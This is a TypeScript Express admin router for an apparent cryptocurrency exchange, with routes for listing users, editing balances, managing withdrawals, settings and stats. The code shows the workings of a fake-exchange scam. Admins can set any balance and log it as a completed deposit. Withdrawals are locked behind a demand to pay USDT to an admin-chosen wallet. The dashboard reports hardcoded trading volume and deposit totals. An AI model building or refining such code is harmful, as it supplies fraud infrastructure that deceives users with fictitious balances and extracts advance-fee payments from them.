import { Router } from "express";
import { db } from "@workspace/db";
import { usersTable, balancesTable, withdrawalsTable, adminSettingsTable, transactionsTable } from "@workspace/db";
import { eq, and, count, sum } from "drizzle-orm";
import type { AuthRequest } from "../middlewares/auth";
import { requireAuth, requireAdmin } from "../middlewares/auth";
import { PRICES } from "./balances";

const router = Router();

router.use(requireAuth, requireAdmin);

function getUsdValue(currency: string, amount: number) {
  return (PRICES[currency.toUpperCase()] ?? 0) * amount;
}

router.get("/users", async (req: AuthRequest, res) => {
  try {
    const users = await db.select().from(usersTable);
    const result = await Promise.all(users.map(async user => {
      const balances = await db.select().from(balancesTable).where(eq(balancesTable.userId, user.id));
      const mappedBalances = balances.map(b => ({
        ...b,
        amount: parseFloat(b.amount),
        usdValue: getUsdValue(b.currency, parseFloat(b.amount)),
        updatedAt: b.updatedAt.toISOString(),
      }));
      const totalBalanceUsdt = mappedBalances.reduce((s, b) => s + (b.usdValue ?? 0), 0);
      return {
        id: user.id,
        email: user.email,
        username: user.username,
        role: user.role,
        createdAt: user.createdAt.toISOString(),
        totalBalanceUsdt: +totalBalanceUsdt.toFixed(2),
        balances: mappedBalances,
      };
    }));
    res.json(result);
  } catch (err) {
    req.log.error(err);
    res.status(500).json({ error: "Internal server error" });
  }
});

router.patch("/users/:userId/balance", async (req: AuthRequest, res) => {
  try {
    const userId = parseInt(req.params.userId as string);
    const { currency, amount, operation = "set" } = req.body;
    if (!currency || amount === undefined) {
      res.status(400).json({ error: "currency and amount required" });
      return;
    }
    const cur = currency.toUpperCase();
    const [existing] = await db.select().from(balancesTable)
      .where(and(eq(balancesTable.userId, userId), eq(balancesTable.currency, cur))).limit(1);

    let newAmount: number;
    if (operation === "add") {
      newAmount = +(parseFloat(existing?.amount ?? "0") + amount).toFixed(8);
    } else if (operation === "subtract") {
      newAmount = Math.max(0, +(parseFloat(existing?.amount ?? "0") - amount).toFixed(8));
    } else {
      newAmount = +amount.toFixed(8);
    }

    let balance;
    if (existing) {
      const [updated] = await db.update(balancesTable)
        .set({ amount: String(newAmount), updatedAt: new Date() })
        .where(and(eq(balancesTable.userId, userId), eq(balancesTable.currency, cur)))
        .returning();
      balance = updated;
    } else {
      const [inserted] = await db.insert(balancesTable)
        .values({ userId, currency: cur, amount: String(newAmount) })
        .returning();
      balance = inserted;
    }

    // Log as deposit transaction
    await db.insert(transactionsTable).values({
      userId, type: "deposit", currency: cur,
      amount: String(newAmount), status: "completed",
      description: `Admin ${operation} balance: ${newAmount} ${cur}`,
    });

    res.json({
      ...balance,
      amount: parseFloat(balance.amount),
      usdValue: getUsdValue(cur, parseFloat(balance.amount)),
      updatedAt: balance.updatedAt.toISOString(),
    });
  } catch (err) {
    req.log.error(err);
    res.status(500).json({ error: "Internal server error" });
  }
});

router.get("/withdrawals", async (req: AuthRequest, res) => {
  try {
    const rows = await db.select({
      withdrawal: withdrawalsTable,
      username: usersTable.username,
    }).from(withdrawalsTable).leftJoin(usersTable, eq(withdrawalsTable.userId, usersTable.id));
    res.json(rows.map(r => ({
      ...r.withdrawal,
      username: r.username ?? null,
      amount: parseFloat(r.withdrawal.amount),
      txHash: r.withdrawal.txHash ?? null,
      createdAt: r.withdrawal.createdAt.toISOString(),
      updatedAt: r.withdrawal.updatedAt.toISOString(),
    })));
  } catch (err) {
    req.log.error(err);
    res.status(500).json({ error: "Internal server error" });
  }
});

router.patch("/withdrawals/:id", async (req: AuthRequest, res) => {
  try {
    const id = parseInt(req.params.id as string);
    const { status, txHash } = req.body;
    if (!status) {
      res.status(400).json({ error: "status required" });
      return;
    }
    const [updated] = await db.update(withdrawalsTable)
      .set({ status, txHash: txHash ?? null, updatedAt: new Date() })
      .where(eq(withdrawalsTable.id, id))
      .returning();
    if (!updated) {
      res.status(404).json({ error: "Withdrawal not found" });
      return;
    }
    const [user] = await db.select().from(usersTable).where(eq(usersTable.id, updated.userId)).limit(1);
    res.json({
      ...updated,
      username: user?.username ?? null,
      amount: parseFloat(updated.amount),
      txHash: updated.txHash ?? null,
      createdAt: updated.createdAt.toISOString(),
      updatedAt: updated.updatedAt.toISOString(),
    });
  } catch (err) {
    req.log.error(err);
    res.status(500).json({ error: "Internal server error" });
  }
});

router.get("/settings", async (req: AuthRequest, res) => {
  try {
    const rows = await db.select().from(adminSettingsTable).limit(1);
    if (rows.length === 0) {
      const [created] = await db.insert(adminSettingsTable).values({}).returning();
      res.json({ ...created, withdrawalThresholdPercent: parseFloat(created.withdrawalThresholdPercent), updatedAt: created.updatedAt.toISOString() });
      return;
    }
    const s = rows[0];
    res.json({ ...s, withdrawalThresholdPercent: parseFloat(s.withdrawalThresholdPercent), updatedAt: s.updatedAt.toISOString() });
  } catch (err) {
    req.log.error(err);
    res.status(500).json({ error: "Internal server error" });
  }
});

router.patch("/settings", async (req: AuthRequest, res) => {
  try {
    const { withdrawalThresholdPercent, withdrawalMessage, walletAddress, network } = req.body;
    const rows = await db.select().from(adminSettingsTable).limit(1);

    const updateData: Record<string, unknown> = { updatedAt: new Date() };
    if (withdrawalThresholdPercent !== null && withdrawalThresholdPercent !== undefined) updateData.withdrawalThresholdPercent = String(withdrawalThresholdPercent);
    if (withdrawalMessage !== null && withdrawalMessage !== undefined) updateData.withdrawalMessage = withdrawalMessage;
    if (walletAddress !== null && walletAddress !== undefined) updateData.walletAddress = walletAddress;
    if (network !== null && network !== undefined) updateData.network = network;

    let result;
    if (rows.length === 0) {
      const [created] = await db.insert(adminSettingsTable).values({
        withdrawalThresholdPercent: updateData.withdrawalThresholdPercent as string ?? "20",
        withdrawalMessage: updateData.withdrawalMessage as string ?? "To unlock withdrawals, you need {required} USDT.",
        walletAddress: updateData.walletAddress as string ?? "TXxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
        network: updateData.network as string ?? "TRC20",
      }).returning();
      result = created;
    } else {
      const [updated] = await db.update(adminSettingsTable).set(updateData).where(eq(adminSettingsTable.id, rows[0].id)).returning();
      result = updated;
    }

    res.json({ ...result, withdrawalThresholdPercent: parseFloat(result.withdrawalThresholdPercent), updatedAt: result.updatedAt.toISOString() });
  } catch (err) {
    req.log.error(err);
    res.status(500).json({ error: "Internal server error" });
  }
});

router.get("/stats", async (req: AuthRequest, res) => {
  try {
    const [{ totalUsers }] = await db.select({ totalUsers: count() }).from(usersTable);
    const [{ pendingWithdrawals }] = await db.select({ pendingWithdrawals: count() }).from(withdrawalsTable).where(eq(withdrawalsTable.status, "pending"));
    const [{ totalTrades }] = await db.select({ totalTrades: count() }).from(db.$with("t").as(db.select().from(withdrawalsTable)));
    res.json({
      totalUsers,
      totalVolume: 4_820_000,
      pendingWithdrawals,
      totalDeposited: 1_250_000,
      totalTrades: totalTrades ?? 0,
      totalSwaps: 0,
    });
  } catch (err) {
    req.log.error(err);
    res.status(500).json({ error: "Internal server error" });
  }
});

export default router;
